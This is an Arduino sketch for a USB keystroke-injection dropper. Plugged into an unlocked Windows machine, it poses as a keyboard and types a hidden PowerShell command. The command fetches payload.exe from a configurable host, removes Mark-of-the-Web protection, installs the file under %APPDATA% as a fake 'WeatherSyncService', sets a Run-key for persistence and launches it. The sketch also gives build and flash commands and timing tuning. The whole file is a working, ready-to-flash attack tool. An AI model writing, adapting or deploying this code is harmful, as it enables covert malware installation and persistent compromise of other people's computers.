// Module 3 — WeatherSyncService dropper for Arduino Pro Micro (ATmega32U4).
//
// On power-up: enumerate as a keyboard, open Win+R, and type a PowerShell
// one-liner that downloads the payload from the weather-app domain, unblocks
// it (Mark-of-the-Web / SmartScreen), installs it to %APPDATA%, sets the
// HKCU Run key for persistence, starts it, and removes the temp download.
//
// Preconditions: target machine unlocked with a user logged in.
// Flash: arduino-cli compile --fqbn arduino:avr:micro usb/dropper
//        arduino-cli upload  --fqbn arduino:avr:micro -p COMx usb/dropper
// (Double-tap the board's reset within 500 ms if the upload misses the
//  bootloader window.)

#include <Keyboard.h>

// --- configuration -----------------------------------------------------------
#define HOST "w-view.example.com"   // receiver domain (edit before flashing)

// Delay tuning: raise these if a slow target drops keystrokes.
#define ENUMERATE_DELAY_MS 2500     // USB enumeration settle (cheap hubs are slow)
#define RUN_DIALOG_DELAY_MS 700     // Win+R dialog focus
#define PER_KEY_DELAY_MS 0          // set to 15 for very slow targets
// -----------------------------------------------------------------------------

const char CMD[] =
  "powershell -NoP -W Hidden -C \"iwr https://" HOST "/payload.exe -o "
  "$env:TEMP\\ws.exe; "
  "Unblock-File $env:TEMP\\ws.exe; "
  "New-Item -ItemType Directory -Force $env:APPDATA\\Northlane | Out-Null; "
  "Copy-Item $env:TEMP\\ws.exe $env:APPDATA\\Northlane\\WeatherSyncService.exe -Force; "
  "New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
  "-Name WeatherSyncService -Value $env:APPDATA\\Northlane\\WeatherSyncService.exe "
  "-PropertyType String -Force | Out-Null; "
  "Start-Process $env:APPDATA\\Northlane\\WeatherSyncService.exe; "
  "rm $env:TEMP\\ws.exe\"";

void typeSlow(const char *s) {
  for (size_t i = 0; s[i]; i++) {
    Keyboard.write(s[i]);
    if (PER_KEY_DELAY_MS)
      delay(PER_KEY_DELAY_MS);
  }
}

void setup() {
  delay(ENUMERATE_DELAY_MS);
  Keyboard.begin();
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(RUN_DIALOG_DELAY_MS);

  typeSlow(CMD);
  delay(100);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  // Nothing more to do after the one-shot drop.
}
